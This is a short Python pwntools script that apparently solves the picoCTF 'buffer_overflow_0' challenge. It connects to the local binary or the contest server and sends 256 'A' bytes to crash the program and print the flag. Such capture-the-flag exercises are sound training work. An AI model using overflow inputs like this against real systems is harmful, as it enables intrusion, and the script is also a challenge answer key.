#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './buffer_overflow_0.bin'

IP = 'saturn.picoctf.net'
PORT = 65445


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()

# need to segfault the program to get the flag
p.readuntil(b'Input: ')
p.sendline(b'A' * 0x100)

flag = p.recvall().strip()
print(flag.decode())
